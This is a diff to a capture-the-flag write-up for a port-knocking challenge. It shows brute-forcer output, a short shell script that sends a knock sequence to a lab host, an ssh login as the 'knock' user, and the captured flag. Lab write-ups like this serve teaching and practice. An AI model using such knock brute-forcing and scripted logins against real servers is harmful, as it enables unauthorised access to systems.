@@ -34,7 +34,7 @@ tmr@desktop:~# python knock_brute.py
 [!] Correct knock sequence founded :('udp:1992', 'tcp:13496', 'udp:7897')
 ```
 
-2. Connect to the server using ssh
+2. Send the knock sequence and connect to the ssh server using knock user
 
 ```
 tmr@desktop:~# cat exploit.sh 
@@ -42,6 +42,11 @@ tmr@desktop:~# cat exploit.sh
 my_server=$1
 knock $my_server 1992:udp 13496:tcp udp:7897:udp
 ssh $my_server -lknock
+```
+
+Execute !
+
+```
 tmr@desktop:~# ./exploit.sh 192.168.121.129
 knock@192.168.121.129's password: 
 Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
@@ -56,3 +61,5 @@ Last login: Mon May 25 14:20:00 2015 from 192.168.121.130
 Flag_KNOCK8KNOCK_9RIB
 Connection to 192.168.121.129 closed.
 ```
+
+The flag was "Flag_KNOCK8KNOCK_9RIB".
